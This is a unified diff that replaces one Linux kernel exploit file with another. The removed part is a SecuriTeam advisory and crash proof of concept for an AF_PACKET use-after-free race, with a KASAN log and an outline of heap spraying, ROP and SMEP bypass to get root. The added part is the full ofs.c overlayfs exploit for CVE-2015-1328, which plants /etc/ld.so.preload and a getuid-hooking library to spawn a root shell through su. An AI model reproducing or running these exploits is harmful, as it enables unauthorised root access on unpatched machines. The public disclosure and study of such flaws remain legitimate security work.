@@ -1,303 +1,152 @@
 /*
-Source: https://blogs.securiteam.com/index.php/archives/3484
-Vulnerabilities summary
-The following advisory describes a use-after-free vulnerability found in Linux Kernel’s implementation of AF_PACKET that can lead to privilege escalation.
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+# Date: 2015-06-15
+# Exploit Author: rebel
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
 
-AF_PACKET sockets “allow users to send or receive packets on the device driver level. This for example lets them to implement their own protocol on top of the physical layer or to sniff packets including Ethernet and higher levels protocol headers”
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1328 / ofs.c
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
 
-Credit
-The vulnerability was discovered by an independent security researcher which reported this vulnerabilities to Beyond Security’s SecuriTeam Secure Disclosure program.
+user@ubuntu-server-1504:~$ uname -a
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+user@ubuntu-server-1504:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+user@ubuntu-server-1504:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
 
-Vendor response
-“It is quite likely that this is already fixed by:
-packet: hold bind lock when rebinding to fanout hook – http://patchwork.ozlabs.org/patch/813945/
-
-Also relevant, but not yet merged is
-packet: in packet_do_bind, test fanout with bind_lock held – http://patchwork.ozlabs.org/patch/818726/
-
-We verified that this does not trigger on v4.14-rc2, but does trigger when reverting that first mentioned commit (008ba2a13f2d).”
-
-
-Vulnerabilities details
-
-This use-after-free is due to a race condition between fanout_add (from setsockopt) and bind on a AF_PACKET socket.
-
-The race will cause __unregister_prot_hook() from packet_do_bind() to set po->running to 0 even though a packet_fanout has been created from fanout_add().
-
-This allows us to bypass the check in unregister_prot_hook() from packet_release() effectively causing the packet_fanout to be released and still being referenced from the packet_type linked list.
-
-Crash Proof of Concept
+greets to beist & kaliman
+2015-05-24
+%rebel%
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
 */
-// Please note, to have KASAN report the UAF, you need to enable it when compiling the kernel.
-// the kernel config is provided too.
- 
-#define _GNU_SOURCE
- 
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <pthread.h>
-#include <sys/utsname.h>
 #include <sched.h>
-#include <stdarg.h>
-#include <stdbool.h>
 #include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <signal.h>
 #include <fcntl.h>
- 
-#define IS_ERR(c, s) { if (c) perror(s); }
- 
-struct sockaddr_ll {
-unsigned short	sll_family;
-short	sll_protocol; // big endian
-int	sll_ifindex;
-unsigned short	sll_hatype;
-unsigned char	sll_pkttype;
-unsigned char	sll_halen;
-unsigned char	sll_addr[8];
-};
- 
-static int fd;
-static struct ifreq ifr;
-static struct sockaddr_ll addr;
- 
-void *task1(void *unused)
+#include <string.h>
+#include <linux/sched.h>
+
+#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
+
+static char child_stack[1024*1024];
+
+static int
+child_exec(void *stuff)
 {
-int fanout_val = 0x3;
- 
-// need race: check on po->running
-// also must be 1st or link wont register
-int err = setsockopt(fd, 0x107, 18, &fanout_val, sizeof(fanout_val));
-// IS_ERR(err == -1, "setsockopt");
+    char *file;
+    system("rm -rf /tmp/ns_sploit");
+    mkdir("/tmp/ns_sploit", 0777);
+    mkdir("/tmp/ns_sploit/work", 0777);
+    mkdir("/tmp/ns_sploit/upper",0777);
+    mkdir("/tmp/ns_sploit/o",0777);
+
+    fprintf(stderr,"mount #1\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
+// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
+            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
+            exit(-1);
+        }
+        file = ".access";
+        chmod("/tmp/ns_sploit/work/work",0777);
+    } else file = "ns_last_pid";
+
+    chdir("/tmp/ns_sploit/o");
+    rename(file,"ld.so.preload");
+
+    chdir("/");
+    umount("/tmp/ns_sploit/o");
+    fprintf(stderr,"mount #2\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
+            exit(-1);
+        }
+        chmod("/tmp/ns_sploit/work/work",0777);
+    }
+
+    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
+    umount("/tmp/ns_sploit/o");
 }
- 
-void *task2(void *unused)
+
+int
+main(int argc, char **argv)
 {
-int err = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
-// IS_ERR(err == -1, "bind");
+    int status, fd, lib;
+    pid_t wrapper, init;
+    int clone_flags = CLONE_NEWNS | SIGCHLD;
+
+    fprintf(stderr,"spawning threads\n");
+
+    if((wrapper = fork()) == 0) {
+        if(unshare(CLONE_NEWUSER) != 0)
+            fprintf(stderr, "failed to create new user namespace\n");
+
+        if((init = fork()) == 0) {
+            pid_t pid =
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+            if(pid < 0) {
+                fprintf(stderr, "failed to create new mount namespace\n");
+                exit(-1);
+            }
+
+            waitpid(pid, &status, 0);
+
+        }
+
+        waitpid(init, &status, 0);
+        return 0;
+    }
+
+    usleep(300000);
+
+    wait(NULL);
+
+    fprintf(stderr,"child threads done\n");
+
+    fd = open("/etc/ld.so.preload",O_WRONLY);
+
+    if(fd == -1) {
+        fprintf(stderr,"exploit failed\n");
+        exit(-1);
+    }
+
+    fprintf(stderr,"/etc/ld.so.preload created\n");
+    fprintf(stderr,"creating shared library\n");
+    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
+    write(lib,LIB,strlen(LIB));
+    close(lib);
+    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+    if(lib != 0) {
+        fprintf(stderr,"couldn't create dynamic library\n");
+        exit(-1);
+    }
+    write(fd,"/tmp/ofs-lib.so\n",16);
+    close(fd);
+    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
+    execl("/bin/su","su",NULL);
 }
- 
-void loop_race()
-{
-int err, index;
- 
-while(1) {
-fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
-IS_ERR(fd == -1, "socket");
- 
-strcpy((char *)&ifr.ifr_name, "lo");
-err = ioctl(fd, SIOCGIFINDEX, &ifr);
-IS_ERR(err == -1, "ioctl SIOCGIFINDEX");
-index = ifr.ifr_ifindex;
- 
-err = ioctl(fd, SIOCGIFFLAGS, &ifr);
-IS_ERR(err == -1, "ioctl SIOCGIFFLAGS");
- 
-ifr.ifr_flags &= ~(short)IFF_UP;
-err = ioctl(fd, SIOCSIFFLAGS, &ifr);
-IS_ERR(err == -1, "ioctl SIOCSIFFLAGS");
- 
-addr.sll_family = AF_PACKET;
-addr.sll_protocol = 0x0; // need something different to rehook && 0 to skip register_prot_hook
-addr.sll_ifindex = index;
- 
-pthread_t thread1, thread2;
-    pthread_create (&thread1, NULL, task1, NULL);
-    pthread_create (&thread2, NULL, task2, NULL);
- 
-    pthread_join(thread1, NULL);
-    pthread_join(thread2, NULL);
- 
-// UAF
-close(fd);
-}
-}
- 
-static bool write_file(const char* file, const char* what, ...) {
-char buf[1024];
-va_list args;
-va_start(args, what);
-vsnprintf(buf, sizeof(buf), what, args);
-va_end(args);
-buf[sizeof(buf) - 1] = 0;
-int len = strlen(buf);
- 
-int fd = open(file, O_WRONLY | O_CLOEXEC);
-if (fd == -1)
-return false;
-if (write(fd, buf, len) != len) {
-close(fd);
-return false;
-}
-close(fd);
-return true;
-}
- 
-void setup_sandbox() {
-int real_uid = getuid();
-int real_gid = getgid();
- 
-if (unshare(CLONE_NEWUSER) != 0) {
-printf("[!] unprivileged user namespaces are not available\n");
-perror("[-] unshare(CLONE_NEWUSER)");
-exit(EXIT_FAILURE);
-}
-if (unshare(CLONE_NEWNET) != 0) {
-perror("[-] unshare(CLONE_NEWUSER)");
-exit(EXIT_FAILURE);
-}
- 
-if (!write_file("/proc/self/setgroups", "deny")) {
-perror("[-] write_file(/proc/self/set_groups)");
-exit(EXIT_FAILURE);
-}
-if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
-perror("[-] write_file(/proc/self/uid_map)");
-exit(EXIT_FAILURE);
-}
-if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
-perror("[-] write_file(/proc/self/gid_map)");
-exit(EXIT_FAILURE);
-}
-}
- 
-int main(int argc, char *argv[])
-{
-setup_sandbox();
-system("id; capsh --print");
-loop_race();
-return 0;
-}
-
-/*
-Crash report
-
-
-[   73.703931] dev_remove_pack: ffff880067cee280 not found
-[   73.717350] ==================================================================
-[   73.726151] BUG: KASAN: use-after-free in dev_add_pack+0x1b1/0x1f0
-[   73.729371] Write of size 8 at addr ffff880067d28870 by task poc/1175
-[   73.732594]
-[   73.733605] CPU: 3 PID: 1175 Comm: poc Not tainted 4.14.0-rc1+ #29
-[   73.737714] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04/01/2014
-[   73.746433] Call Trace:
-[   73.747985]  dump_stack+0x6c/0x9c
-[   73.749410]  ? dev_add_pack+0x1b1/0x1f0
-[   73.751622]  print_address_description+0x73/0x290
-[   73.753646]  ? dev_add_pack+0x1b1/0x1f0
-[   73.757343]  kasan_report+0x22b/0x340
-[   73.758839]  __asan_report_store8_noabort+0x17/0x20
-[   73.760617]  dev_add_pack+0x1b1/0x1f0
-[   73.761994]  register_prot_hook.part.52+0x90/0xa0
-[   73.763675]  packet_create+0x5e3/0x8c0
-[   73.765072]  __sock_create+0x1d0/0x440
-[   73.766030]  SyS_socket+0xef/0x1b0
-[   73.766891]  ? move_addr_to_kernel+0x60/0x60
-[   73.769137]  ? exit_to_usermode_loop+0x118/0x150
-[   73.771668]  entry_SYSCALL_64_fastpath+0x13/0x94
-[   73.773754] RIP: 0033:0x44d8a7
-[   73.775130] RSP: 002b:00007ffc4e642818 EFLAGS: 00000217 ORIG_RAX: 0000000000000029
-[   73.780503] RAX: ffffffffffffffda RBX: 00000000004002f8 RCX: 000000000044d8a7
-[   73.785654] RDX: 0000000000000011 RSI: 0000000000000003 RDI: 0000000000000011
-[   73.790358] RBP: 00007ffc4e642840 R08: 00000000000000ca R09: 00007f4192e6e9d0
-[   73.793544] R10: 0000000000000000 R11: 0000000000000217 R12: 000000000040b410
-[   73.795999] R13: 000000000040b4a0 R14: 0000000000000000 R15: 0000000000000000
-[   73.798567]
-[   73.799095] Allocated by task 1360:
-[   73.800300]  save_stack_trace+0x16/0x20
-[   73.802533]  save_stack+0x46/0xd0
-[   73.803959]  kasan_kmalloc+0xad/0xe0
-[   73.805833]  kmem_cache_alloc_trace+0xd7/0x190
-[   73.808233]  packet_setsockopt+0x1d29/0x25c0
-[   73.810226]  SyS_setsockopt+0x158/0x240
-[   73.811957]  entry_SYSCALL_64_fastpath+0x13/0x94
-[   73.814636]
-[   73.815367] Freed by task 1175:
-[   73.816935]  save_stack_trace+0x16/0x20
-[   73.821621]  save_stack+0x46/0xd0
-[   73.825576]  kasan_slab_free+0x72/0xc0
-[   73.827477]  kfree+0x91/0x190
-[   73.828523]  packet_release+0x700/0xbd0
-[   73.830162]  sock_release+0x8d/0x1d0
-[   73.831612]  sock_close+0x16/0x20
-[   73.832906]  __fput+0x276/0x6d0
-[   73.834730]  ____fput+0x15/0x20
-[   73.835998]  task_work_run+0x121/0x190
-[   73.837564]  exit_to_usermode_loop+0x131/0x150
-[   73.838709]  syscall_return_slowpath+0x15c/0x1a0
-[   73.840403]  entry_SYSCALL_64_fastpath+0x92/0x94
-[   73.842343]
-[   73.842765] The buggy address belongs to the object at ffff880067d28000
-[   73.842765]  which belongs to the cache kmalloc-4096 of size 4096
-[   73.845897] The buggy address is located 2160 bytes inside of
-[   73.845897]  4096-byte region [ffff880067d28000, ffff880067d29000)
-[   73.851443] The buggy address belongs to the page:
-[   73.852989] page:ffffea00019f4a00 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0
-[   73.861329] flags: 0x100000000008100(slab|head)
-[   73.862992] raw: 0100000000008100 0000000000000000 0000000000000000 0000000180070007
-[   73.866052] raw: dead000000000100 dead000000000200 ffff88006cc02f00 0000000000000000
-[   73.870617] page dumped because: kasan: bad access detected
-[   73.872456]
-[   73.872851] Memory state around the buggy address:
-[   73.874057]  ffff880067d28700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[   73.876931]  ffff880067d28780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[   73.878913] >ffff880067d28800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[   73.880658]                                                              ^
-[   73.884772]  ffff880067d28880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[   73.890978]  ffff880067d28900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[   73.897763] ==================================================================
-
-
-We know that the freed object is a kmalloc-4096 object:
-
-
-```
-struct packet_fanout {
-possible_net_t	net;
-unsigned int	num_members;
-u16	id;
-u8	type;
-u8	flags;
-union {
-atomic_t	rr_cur;
-struct bpf_prog __rcu	*bpf_prog;
-};
-struct list_head	list;
-struct sock	*arr[PACKET_FANOUT_MAX];
-spinlock_t	lock;
-refcount_t	sk_ref;
-struct packet_type	prot_hook ____cacheline_aligned_in_smp;
-};
-```
-and that its prot_hook member is the one being referenced in the packet handler when registered via dev_add_pack() from register_prot_hook() inside af_packet.c:
-
-```
-struct packet_type {
-__be16	type;	// This is really htons(ether_type). 
-struct net_device	*dev;	// NULL is wildcarded here	    
-int	(*func) (struct sk_buff *,
-struct net_device *,
-struct packet_type *,
-struct net_device *);
-bool	(*id_match)(struct packet_type *ptype,
-    struct sock *sk);
-void	*af_packet_priv;
-struct list_head	list;
-};
-```
-The function pointers inside of struct packet_type, and the fact it is in a big slab (kmalloc-4096) makes heap spraying easier and more reliable as bigger slabs are less often used by the kernel.
-
-We can use usual kernel heap spraying to replace the content of the freed packet_fanout object by using for example sendmmsg() or any other mean.
-
-Even if the allocation is not permanent, it will still replace the targeted content in packet_fanout (ie. the function pointers) and due to the fact that kmalloc-4096 is very stable, it is very less likely that another allocation will corrupt our payload.
-
-id_match() will be called when sending a skb via dev_queue_xmit() which can be reached via a sendmsg on a AF_PACKET socket. It will loop through the list of packet handler calling id_match() if not NULL. Thus, we have a PC control situation.
-
-Once we know where the code section of the kernel is, we can pivot the kernel stack into our fake packet_fanout object and ROP. The first argument ptype contains the address of the prot_hook member of our fake object, which allows us to know where to pivot.
-
-Once into ROP, we can jump into native_write_c4(x) to disable SMEP/SMAP, and then we could think about jumping back into a userland mmaped executable payload that would call commit_creds(prepare_kernel_cred(0)) to elevate our user process privilege to root.
-*/
